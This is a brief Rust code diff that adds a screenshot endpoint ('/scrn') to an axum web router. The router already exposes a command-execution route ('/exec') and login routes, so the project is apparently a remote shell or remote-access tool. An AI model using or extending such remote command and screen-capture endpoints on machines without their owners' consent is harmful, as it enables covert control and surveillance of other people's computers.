@@ -1,4 +1,5 @@
 mod exec;
+mod scrn;
 
 use crate::ShellState;
 use axum::{
@@ -12,5 +13,6 @@ pub fn all_routes(shellpath: Arc<Mutex<ShellState>>) -> Router {
         .route("/", get("login with username and password"))
         .route("/set", get("update username & password"))
         .route("/exec", post(exec::exec_cmd))
+        .route("/scrn", post(scrn::screenshot))
         .layer(Extension(shellpath))
 }
